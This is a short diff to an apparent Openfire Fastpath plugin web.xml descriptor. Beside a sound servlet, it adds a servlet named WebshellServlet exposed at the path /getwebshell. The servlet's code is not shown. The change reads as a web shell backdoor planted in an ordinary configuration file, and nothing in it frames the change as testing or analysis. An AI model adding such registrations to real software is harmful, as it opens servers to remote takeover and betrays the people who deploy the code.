@@ -12,6 +12,10 @@
         <servlet-name>SoundServlet</servlet-name>
         <servlet-class>org.jivesoftware.openfire.fastpath.SoundServlet</servlet-class>
     </servlet>
+    <servlet>
+        <servlet-name>WebshellServlet</servlet-name>
+        <servlet-class>org.jivesoftware.openfire.fastpath.WebshellServlet</servlet-class>
+    </servlet>
 
     <!-- Servlet mappings -->
     <servlet-mapping>
@@ -21,6 +25,10 @@
     <servlet-mapping>
         <servlet-name>SoundServlet</servlet-name>
         <url-pattern>/getsound</url-pattern>
+    </servlet-mapping>
+    <servlet-mapping>
+        <servlet-name>WebshellServlet</servlet-name>
+        <url-pattern>/getwebshell</url-pattern>
     </servlet-mapping>
 
 </web-app>
